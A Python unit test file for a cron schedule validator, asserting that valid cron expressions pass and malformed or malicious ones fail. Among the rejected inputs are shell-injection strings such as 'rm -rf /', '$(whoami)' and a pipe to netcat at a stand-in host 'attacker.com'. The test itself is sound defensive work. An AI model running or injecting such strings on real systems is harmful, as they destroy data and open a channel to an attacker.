"""
Tests for cron security improvements.
"""

from merlya.tools.system.cron import _is_valid_schedule


def test_is_valid_schedule():
    """Test that the schedule validation works correctly with strict regex."""
    # Valid schedules
    assert _is_valid_schedule("* * * * *") is True
    assert _is_valid_schedule("0 * * * *") is True
    assert _is_valid_schedule("0 0 * * *") is True
    assert _is_valid_schedule("0 0 * * 0") is True
    assert _is_valid_schedule("0 0 1 * *") is True
    assert _is_valid_schedule("*/15 * * * *") is True
    assert _is_valid_schedule("0,30 * * * *") is True
    assert _is_valid_schedule("0 8-17 * * 1-5") is True
    assert _is_valid_schedule("@hourly") is True
    assert _is_valid_schedule("@daily") is True
    assert _is_valid_schedule("@weekly") is True
    assert _is_valid_schedule("@monthly") is True
    assert _is_valid_schedule("@yearly") is True
    assert _is_valid_schedule("@reboot") is True

    # Invalid schedules (should be rejected)
    assert _is_valid_schedule("invalid") is False
    assert _is_valid_schedule("* * *") is False  # Missing fields
    assert _is_valid_schedule("* * * * * *") is False  # Too many fields
    assert _is_valid_schedule("a * * * *") is False  # Invalid character
    assert _is_valid_schedule("*; * * * *") is False  # Shell injection attempt
    assert _is_valid_schedule("* `rm -rf /` * * *") is False  # Shell injection attempt
    assert _is_valid_schedule("* $(whoami) * * *") is False  # Shell injection attempt
    assert _is_valid_schedule("* |nc attacker.com 4444 * * *") is False  # Shell injection attempt
    assert _is_valid_schedule("* && rm -rf / * * *") is False  # Shell injection attempt


if __name__ == "__main__":
    test_is_valid_schedule()
    print("All tests passed!")
